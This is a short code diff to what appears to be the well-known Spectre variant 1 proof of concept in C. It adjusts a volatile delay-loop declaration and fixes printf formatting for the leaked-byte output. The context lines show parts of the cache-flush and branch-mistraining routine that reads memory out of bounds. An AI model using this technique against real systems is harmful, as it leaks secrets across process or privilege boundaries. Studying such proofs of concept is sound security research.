@@ -73,7 +73,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
         training_x = tries % array1_size;
         for (j = 29; j >= 0; j--) {
             _mm_clflush(&array1_size);
-            for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+	    volatile int z = 0;
+            for (z = 0; z < 100; z++) {} /* Delay (can also mfence) */
  
             /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
             /* Avoid jumps in case those tip off the branch predictor */
@@ -134,9 +135,9 @@ int main(int argc, const char **argv) {
         printf("Reading at malicious_x = %p... ", (void*)malicious_x);
         readMemoryByte(malicious_x++, value, score);
         printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
-        printf("0x%02X=a%ca score=%d ", 
+        printf("0x%02X=%c score='%d' ", 
                 value[0], 
-                (value[0] > 31 && value[0] < 127 ? value[0] : "a?a"), 
+                (value[0] > 31 && value[0] < 127 ? value[0] : '?'), 
                 score[0]);
         if (score[1] > 0)
             printf("(second best: 0x%02X score=%d)", value[1], score[1]);
